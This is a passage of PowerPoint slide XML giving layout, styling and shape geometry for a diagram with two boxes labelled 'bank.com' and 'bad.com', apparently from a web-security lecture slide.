                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534860" y="4431170"/>
            <a:ext cx="1485099" cy="1339453"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="2176145" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2176145" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2176145" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0">
            <a:schemeClr val="accent3"/>
          </a:lnRef>
          <a:fillRef idx="3">
            <a:schemeClr val="accent3"/>
          </a:fillRef>
          <a:effectRef idx="3">
            <a:schemeClr val="accent3"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="lt1"/>
          </a:fontRef>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="white"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="4430526"/>
            <a:ext cx="1484779" cy="831028"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2634" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="21"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="78572" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160777" name="object 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="1350309"/>
            <a:ext cx="1536606" cy="1393732"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160778" name="object 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="1360114"/>
            <a:ext cx="1484779" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="object 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="1360115"/>
            <a:ext cx="1484779" cy="830584"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2194" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="18"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="157586" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bad.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160780" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7887541" y="2745441"/>
            <a:ext cx="0" cy="1497386"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T1" fmla="*/ 4537 h 2130425"/>
              <a:gd name="T2" fmla="*/ 0 60000 65536"/>
              <a:gd name="T3" fmla="*/ 0 60000 65536"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="T2">
                <a:pos x="0" y="T0"/>
              </a:cxn>
              <a:cxn ang="T3">
                <a:pos x="0" y="T1"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path h="2130425">
                <a:moveTo>
                  <a:pt x="-38100" y="1065129"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="38100" y="1065129"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="2130259">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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160781" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7783886" y="4216213"/>
            <a:ext cx="207309" cy="214313"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 590 w 304800"/>
              <a:gd name="T1" fmla="*/ 0 h 304800"/>
              <a:gd name="T2" fmla="*/ 0 w 304800"/>
              <a:gd name="T3" fmla="*/ 0 h 304800"/>
              <a:gd name="T4" fmla="*/ 294 w 304800"/>
              <a:gd name="T5" fmla="*/ 1311 h 304800"/>
              <a:gd name="T6" fmla="*/ 590 w 304800"/>
              <a:gd name="T7" fmla="*/ 0 h 3048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04800" h="304800">
                <a:moveTo>
                  <a:pt x="304800" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152400" y="304800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30480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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160782" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8051426" y="2951349"/>
            <a:ext cx="320769" cy="330574"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 796 w 471170"/>
              <a:gd name="T1" fmla="*/ 281 h 471170"/>
              <a:gd name="T2" fmla="*/ 856 w 471170"/>
              <a:gd name="T3" fmla="*/ 433 h 471170"/>
              <a:gd name="T4" fmla="*/ 899 w 471170"/>
              <a:gd name="T5" fmla="*/ 600 h 471170"/>
              <a:gd name="T6" fmla="*/ 924 w 471170"/>
              <a:gd name="T7" fmla="*/ 778 h 471170"/>
              <a:gd name="T8" fmla="*/ 933 w 471170"/>
              <a:gd name="T9" fmla="*/ 961 h 471170"/>
              <a:gd name="T10" fmla="*/ 924 w 471170"/>
              <a:gd name="T11" fmla="*/ 1145 h 471170"/>
              <a:gd name="T12" fmla="*/ 899 w 471170"/>
              <a:gd name="T13" fmla="*/ 1322 h 471170"/>
              <a:gd name="T14" fmla="*/ 856 w 471170"/>
              <a:gd name="T15" fmla="*/ 1489 h 471170"/>
              <a:gd name="T16" fmla="*/ 796 w 471170"/>
              <a:gd name="T17" fmla="*/ 1640 h 471170"/>
              <a:gd name="T18" fmla="*/ 723 w 471170"/>
              <a:gd name="T19" fmla="*/ 1764 h 471170"/>
              <a:gd name="T20" fmla="*/ 642 w 471170"/>
              <a:gd name="T21" fmla="*/ 1851 h 471170"/>
              <a:gd name="T22" fmla="*/ 556 w 471170"/>
              <a:gd name="T23" fmla="*/ 1903 h 471170"/>
              <a:gd name="T24" fmla="*/ 466 w 471170"/>
              <a:gd name="T25" fmla="*/ 1921 h 471170"/>
              <a:gd name="T26" fmla="*/ 377 w 471170"/>
              <a:gd name="T27" fmla="*/ 1903 h 471170"/>
              <a:gd name="T28" fmla="*/ 291 w 471170"/>
              <a:gd name="T29" fmla="*/ 1851 h 471170"/>
              <a:gd name="T30" fmla="*/ 210 w 471170"/>
              <a:gd name="T31" fmla="*/ 1764 h 471170"/>
              <a:gd name="T32" fmla="*/ 137 w 471170"/>
              <a:gd name="T33" fmla="*/ 1640 h 471170"/>
              <a:gd name="T34" fmla="*/ 77 w 471170"/>
              <a:gd name="T35" fmla="*/ 1489 h 471170"/>
              <a:gd name="T36" fmla="*/ 34 w 471170"/>
              <a:gd name="T37" fmla="*/ 1322 h 471170"/>
              <a:gd name="T38" fmla="*/ 9 w 471170"/>
              <a:gd name="T39" fmla="*/ 1145 h 471170"/>
              <a:gd name="T40" fmla="*/ 0 w 471170"/>
              <a:gd name="T41" fmla="*/ 961 h 471170"/>
              <a:gd name="T42" fmla="*/ 9 w 471170"/>
              <a:gd name="T43" fmla="*/ 778 h 471170"/>
              <a:gd name="T44" fmla="*/ 34 w 471170"/>
              <a:gd name="T45" fmla="*/ 600 h 471170"/>
              <a:gd name="T46" fmla="*/ 77 w 471170"/>
              <a:gd name="T47" fmla="*/ 433 h 471170"/>
              <a:gd name="T48" fmla="*/ 137 w 471170"/>
              <a:gd name="T49" fmla="*/ 281 h 471170"/>
              <a:gd name="T50" fmla="*/ 210 w 471170"/>
              <a:gd name="T51" fmla="*/ 158 h 471170"/>
              <a:gd name="T52" fmla="*/ 291 w 471170"/>
              <a:gd name="T53" fmla="*/ 70 h 471170"/>
              <a:gd name="T54" fmla="*/ 377 w 471170"/>
              <a:gd name="T55" fmla="*/ 17 h 471170"/>
              <a:gd name="T56" fmla="*/ 466 w 471170"/>
              <a:gd name="T57" fmla="*/ 0 h 471170"/>
              <a:gd name="T58" fmla="*/ 556 w 471170"/>
              <a:gd name="T59" fmla="*/ 17 h 471170"/>
              <a:gd name="T60" fmla="*/ 642 w 471170"/>
              <a:gd name="T61" fmla="*/ 70 h 471170"/>
              <a:gd name="T62" fmla="*/ 723 w 471170"/>
              <a:gd name="T63" fmla="*/ 158 h 471170"/>
              <a:gd name="T64" fmla="*/ 796 w 471170"/>
              <a:gd name="T65" fmla="*/ 281 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="401862" y="68948"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="432027" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470810" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="432027" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="470810"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="68948"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="68948"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160783" name="object 13"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8072439" y="2910729"/>
            <a:ext cx="1318091" cy="12850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58738">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
